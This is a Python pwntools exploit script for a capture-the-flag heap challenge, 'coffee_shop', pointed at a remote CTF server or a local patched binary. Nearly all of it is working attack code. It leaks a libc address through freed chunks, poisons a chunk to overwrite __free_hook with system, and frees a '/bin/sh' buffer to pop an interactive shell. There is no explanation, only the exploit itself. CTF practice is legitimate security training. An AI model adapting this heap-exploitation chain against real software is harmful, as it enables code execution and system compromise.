from pwn import *
import sys

libc = ELF("libc-2.31.so")
if sys.argv[1] == "r":
    p = remote("coffee-shop.chal.idek.team", 1337)
else: 
    p = process("./coffee_shop_patched", env={"LD_PRELOAD":"libc-2.31.so"})
    context.terminal = ["tmux","splitw","-h"]
    gdb.attach(p, """ 
                continue
                """)

def file(size, content):
    p.sendlineafter("> ", "4")
    p.sendlineafter("contain: ", str(size))
    if size > 0:
        p.sendafter("complaint: ", content)

def revert(index):
    p.sendlineafter("> ", "5")
    p.sendlineafter("ID: ", str(index))

def edit(index, content):
    p.sendlineafter("> ", "6")
    p.sendlineafter("ID: ", str(index))
    p.sendafter("(again): ", content)

def view(index):
    p.sendlineafter("> ", "7")
    p.sendlineafter("ID: ", str(index))

def solve():
    file(0x60, "A"*7 + "\n")    # 0
    file(0x50, "A"*7 + "\n")    # 1
    file(1, "")                 # 2
    file(0x4F0, "\n")           # 3
    file(1, "")                 # 4 => prevent merge to top chunk
    revert(2)
    revert(4)
    edit(4, "")

    file(1, "")                 # 5
    file(0x11, p64(0) + p64(0x581)) # 6

    revert(1)
    view(1)
    leak = u64(p.recv(6) + "\x00\x00")
    libc.address = leak - 0x1ebbe0
    system = libc.symbols["system"]
    free_hook = libc.symbols["__free_hook"]
    success("libc: %s"%hex(libc.address))
    success("system: %s"%hex(system))
    success("free_hook: %s"%hex(free_hook))
    
    print("sasss")
    
    revert(5)
    revert(2)

    file(0x100, "B"*0x50 + p64(0) + p64(0x21) + p64(free_hook) + "\n")  # 7
    
    file(0xa, "/bin/sh\x00\n")

    file(0xa, p64(system) + "\n")
    # file(0xa, p64(libc.address + 0xe6c84) + "\n")
    # p.interactive()

    # pop shell
    # pause()
    revert(6)
    p.interactive()


if __name__ == "__main__":
    solve()